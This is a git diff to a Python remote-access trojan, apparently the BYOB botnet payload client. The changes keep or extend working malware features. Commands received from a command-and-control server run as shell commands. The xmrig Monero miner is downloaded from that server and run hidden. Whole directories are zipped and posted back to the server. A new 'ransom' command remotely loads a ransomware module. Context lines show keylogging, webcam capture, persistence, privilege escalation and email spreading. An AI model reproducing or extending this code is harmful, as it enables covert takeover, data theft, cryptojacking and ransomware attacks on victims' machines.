@@ -20,6 +20,11 @@ import threading
 import subprocess
 import collections
 import logging.handlers
+import traceback
+import zipfile
+import pathlib
+
+
 if sys.version_info[0] < 3:
     from urllib import urlretrieve
     from urllib2 import urlopen, urlparse
@@ -38,7 +43,8 @@ except ImportError:
     pass
 
 
-def log(info, level='debug'):
+def log(info, level='debug', line = -1):
+    # print(f"Line: ${line}", info)
     logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
@@ -115,10 +121,59 @@ class Payload():
         return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())
 
 
-    def _get_command(self, cmd):
+    """ 
+    This function can be optimized to take the task only and split out cmd here.
+    cmd isn't used at all in parent scope
+    """
+    def _get_command(self, cmd, task = None):
+        # Check if the function already exists
         if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
             return getattr(self, cmd)
-        return False
+
+
+        """
+        Below is a good update. It autoloads modules if you call them. I think the bash use-case 
+            is a bit unintutitve without a load, but thats just my opinion. Eval also fulfils 
+            this functionality so its not removing anything from the shell
+        I just want to make sure this doesn't break the GUI in any way
+        Lmk if you think this is a good update
+        """
+
+        # # Attempt to import the function
+        # load_result = self.load(cmd)
+        # # Check if the module loaded correctly
+
+        if cmd in globals():
+            return globals()[cmd].run
+
+
+        """
+        This can be optimized away when task is only arg to function
+        """
+        if task == None:
+            def NoTask():
+                return "No task passed into _get_command"
+            return NoTask
+
+        # Define a function which will execute the text as a bash script
+        def execute_task(tmp = None):
+            # Encode the task if needed
+            encoded_task = task['task'].encode()
+
+            # Use subprocess.Popen to create the process
+            process = subprocess.Popen(encoded_task, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+
+            # Use communicate to get the result and errors
+            result, reserr = process.communicate()
+
+            # Return only 1 string value so this behaves like other functions
+            if result == None:
+                result = reserr
+
+            # Return the result and errors
+            return result.decode()
+
+        return execute_task
 
 
     def _get_connection(self, host, port):
@@ -329,7 +384,8 @@ class Payload():
         try:
             return eval(code)
         except Exception as e:
-            return "{} error: {}".format(self.eval.__name__, str(e))
+            return traceback.format_exc()
+            # return "{} error: {}".format(self.eval.__name__, str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
@@ -357,6 +413,7 @@ class Payload():
                 return path
             except Exception as e:
                 log("{} error: {}".format(self.wget.__name__, str(e)))
+                return traceback.format_exc()
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -394,6 +451,7 @@ class Payload():
 
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
@@ -410,11 +468,13 @@ class Payload():
                 return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
+                return traceback.format_exc()
         elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
                 return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
+                return traceback.format_exc()
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
 
@@ -432,12 +492,15 @@ class Payload():
 
         """
         args = str(args).split()
+
         if len(args) == 1:
             module, target = args[0], ''
         elif len(args) == 2:
             module, target = args
         else:
+            log("usage: {}".format(self.load.usage))
             return "usage: {}".format(self.load.usage)
+
         target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
         host, port = self.connection.getpeername()
         base_url_1 = 'http://{}:{}'.format(host, port + 1)
@@ -450,7 +513,8 @@ class Payload():
                     return '[+] {} remotely imported'.format(module)
                 except Exception as e:
                     log("{} error: {}".format(self.load.__name__, str(e)))
-                    return "{} error: {}".format(self.load.__name__, str(e))
+                    return traceback.format_exc()
+                    # return "{} error: {}".format(self.load.__name__, str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
@@ -470,6 +534,7 @@ class Payload():
                 return "Job '{}' not found".format(target)
         except Exception as e:
             log("{} error: {}".format(self.stop.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
@@ -509,6 +574,7 @@ class Payload():
                 return self.show.usage
         except Exception as e:
             log("'{}' error: {}".format(_threads.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
@@ -563,53 +629,11 @@ class Payload():
         """
         args = str(args).split()
 
-        if 'run' in args and len(args) == 4:
-            cmd, url, port, user = args
+        if len(args) != 4:
+            return "usage: {}".format(self.miner.usage)
 
-            # type check port argument
-            if not port.isdigit():
-                return "Error: port must be a digit 1-65535"
 
-            # first attempt using built-in python miner
-            try:
-                import pycryptonight, pyrx
-                self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
-                self.child_procs['miner_py'].start()
-                return "Miner running in " + str(self.child_procs['miner_py']).pid
-            except Exception as e:
-                log("{} error: {}".format(self.miner.__name__, str(e)))
-
-                # if that fails, try downloading and running xmrig
-                try:
-                    threads = multiprocessing.cpu_count() - 1
-
-                    # pull xmrig from server if necessary
-                    if not self.xmrig_path_dev:
-                        self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
-
-                        # set up executable
-                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
-                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
-                            self.xmrig_path += '.exe'
-
-                        os.chmod(self.xmrig_path, 755)
-
-                        # excute xmrig in hidden process
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                    else:
-                        # restart miner if it already exists
-                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
-                        if name in self.execute.process_list:
-                            self.execute.process_list[name].kill()
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                except Exception as e:
-                    log("{} error: {}".format(self.miner.__name__, str(e)))
-
-        elif 'stop' in args:
+        if 'stop' in args:
             # kill python miner
             if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
                 self.child_procs['miner_py'].terminate()
@@ -621,7 +645,59 @@ class Payload():
 
             return "Miner stopped."
 
-        return "usage: {}".format(self.miner.usage)
+        elif 'run' not in args:
+            return "usage: {}".format(self.miner.usage)
+
+
+        # In "run" command section
+        cmd, url, port, user = args
+
+
+        # type check port argument
+        if not port.isdigit():
+            return "Error: port must be a digit 1-65535"
+
+        # first attempt using built-in python miner
+        try:
+            # import pycryptonight, pyrx
+            # import pycryptonight, hashlib # This is unnecessary due to build process
+            self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
+            self.child_procs['miner_py'].start()
+            return "Miner running in " + str(self.child_procs['miner_py']).pid
+
+        except Exception as e:
+            log("{} error: {}".format(self.miner.__name__, str(e)))
+
+            # if that fails, try downloading and running xmrig
+            try:
+                threads = multiprocessing.cpu_count() - 1
+
+                # pull xmrig from server if necessary
+                if not self.xmrig_path_dev:
+                    self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+
+                    # set up executable
+                    if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
+                        os.rename(self.xmrig_path, self.xmrig_path + '.exe')
+                        self.xmrig_path += '.exe'
+
+                    os.chmod(self.xmrig_path, 755)
+
+                    # excute xmrig in hidden process
+                    params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                    result = self.execute(params)
+                    return result
+                else:
+                    # restart miner if it already exists
+                    name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
+                    if name in self.execute.process_list:
+                        self.execute.process_list[name].kill()
+                    params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                    result = self.execute(params)
+                    return result
+            except Exception as e:
+                log("{} error: {}".format(self.miner.__name__, str(e)))
+                return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
@@ -639,8 +715,27 @@ class Payload():
                 _, filetype = os.path.splitext(filename)
                 with open(filename, 'rb') as fp:
                     data = base64.b64encode(fp.read())
-                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                # decode bytes into a utf-8 encoded string
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                return "Upload complete"
+            elif os.path.isdir(filename):
+                host, port = self.connection.getpeername()
+                folder = pathlib.Path(filename)
+                # Exfiltration of dir done with temp zip file on memory
+                zip_path = './temp.zip'
+                with zipfile.ZipFile(zip_path, 'w') as zip:
+                    for file in folder.iterdir():
+                        zip.write(file)
+                zip.close()
+                with open("temp.zip", 'rb') as fp:
+                    data = base64.b64encode(fp.read())
+                # decode bytes into a utf-8 encoded string
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': ".zip", 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                os.remove("temp.zip")
                 return "Upload complete"
             else:
                 return "Error: file not found"
@@ -691,6 +786,7 @@ class Payload():
             return "Webcam capture complete"
         except Exception as e:
             log("{} error: {}".format(self.webcam.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
@@ -717,6 +813,7 @@ class Payload():
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
             log("{} error: {}".format(self.restart.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
@@ -760,6 +857,7 @@ class Payload():
                     return self.outlook.usage
             except Exception as e:
                 log("{} error: {}".format(self.email.__name__, str(e)))
+                return traceback.format_exc()
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -774,6 +872,7 @@ class Payload():
             return globals()['escalate'].run(sys.argv[0])
         except Exception as e:
             log("{} error: {}".format(self.escalate.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
@@ -843,7 +942,32 @@ class Payload():
             return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
             log("{} error: {}".format(self.process.__name__, str(e)))
+            return traceback.format_exc()
 
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ransom <target>')
+    def ransom(self, target=None):
+        """
+        Scan a target host or network to identify
+        other target hosts and open ports.
+
+        `Required`
+        :param str target:      IPv4 address
+
+        """
+        res = "Success!"
+        try:
+            if 'ransom' not in globals():
+                load_res = self.load('ransom')
+                if 'remotely imported' not in load_res:
+                    return load_res
+
+            res = globals()['ransom'].run(target)
+            return res
+
+        except Exception as e:
+            log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            return traceback.format_exc()
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
     def portscanner(self, target=None):
@@ -858,14 +982,22 @@ class Payload():
         if 'portscanner' not in globals():
             self.load('portscanner')
         try:
-            if target:
-                if not ipv4(target):
-                    return "Error: invalid IP address '%s'" % target
-                return globals()['portscanner'].run(target)
-            else:
+
+            if not target:
                 return self.portscanner.usage
+
+            if not ipv4(target):
+                return "Error: invalid IP address '%s'" % target
+
+            res = globals()['portscanner'].run(target)
+            portscanner.run(target)
+            return res
+
         except Exception as e:
             log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            return traceback.format_exc()
+
+        return "Error!"
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
@@ -883,6 +1015,7 @@ class Payload():
                 return "Log size: {} bytes".format(length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
+                return traceback.format_exc()
         if 'keylogger' not in globals():
             self.load('keylogger')
         if not mode:
@@ -936,9 +1069,8 @@ class Payload():
             globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             return 'Screenshot complete'
         except Exception as e:
-            result = "{} error: {}".format(self.screenshot.__name__, str(e))
-            log(result)
-            return result
+            log("{} error: {}".format(self.screenshot.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
@@ -974,6 +1106,7 @@ class Payload():
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
@@ -1013,6 +1146,7 @@ class Payload():
                     return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','darwin','linux','linux2'], command=True, usage='spread <gmail> <password> <URL email list>')
@@ -1036,6 +1170,7 @@ class Payload():
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
             return '{} error: {}'.format(self.spread.__name__, str(e))
+            return traceback.format_exc()
 
 
     def send_task(self, task):
@@ -1146,42 +1281,61 @@ class Payload():
 
             # active mode
             elif self.flags.connection.wait(timeout=1.0):
+                # Get Task
                 task = self.recv_task()
-                if self.gui or not self.flags.prompt.is_set():
-                    if isinstance(task, dict) and 'task' in task:
-                        cmd, _, action = task['task'].partition(' ')
-                        try:
-                            # run command as module if module exists.
-                            # otherwise, run as shell command in subprocess
-                            command = self._get_command(cmd)
-                            if command:
-                                result = command(action) if action else command()
-                            else:
-                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
-                                if result == None:
-                                    result = reserr
 
-                            # format result
-                            if result != None:
-                                if type(result) in (list, tuple):
-                                    result = '\n'.join(result)
-                                elif type(result) == bytes:
-                                    result = str(result.decode())
-                                else:
-                                    result = str(result)
-                        except Exception as e:
-                            result = "{} error: {}".format(self.run.__name__, str(e)).encode()
-                            log(result)
+                # Should we kill this process? 
+                if not (self.gui or not self.flags.prompt.is_set()) and self.flags.prompt.set() \
+                  and not self.flags.connection.wait(timeout=1.0):
+                    self.kill()
 
-
-                        # send response to server
-                        task.update({'result': result})
-                        self.send_task(task)
-
+                if not isinstance(task, dict) or 'task' not in task:
                     if not self.gui:
                         self.flags.prompt.set()
-                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
-                    self.kill()
+                    continue 
+
+                """
+                THIS COULD BE OPTIMIZED TO TAKE ONLY TASK. 
+                NEED TO VERIFY IT DOESN'T BREAK GUI THOUGH
+                """
+                cmd, _, action = task['task'].partition(' ')
+                try:
+                    # run command as module if module exists.
+                    # otherwise, run as shell command in subprocess
+                    command = self._get_command(cmd, task)
+                    result = command(action) if action else command()
+
+                    """
+                    if command:
+                        result = command(action) if action else command()
+                    else:
+                        result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
+                        if result == None:
+                            result = reserr
+                    """
+
+                    # format result
+                    if type(result) in (list, tuple):
+                        result = '\n'.join(result)
+                    elif type(result) == bytes:
+                        result = str(result.decode())
+                    else:
+                        result = str(result) if result else None
+
+                except Exception as e:
+                    # result = "{} error: {}".format(self.run.__name__, str(e)).encode()
+                    result = traceback.format_exc()
+                    log(result)
+
+
+
+                # send response to server
+                task.update({'result': result})
+                self.send_task(task)
+
+                if not self.gui:
+                    self.flags.prompt.set()
             else:
                 log("Connection timed out")
                 break
+
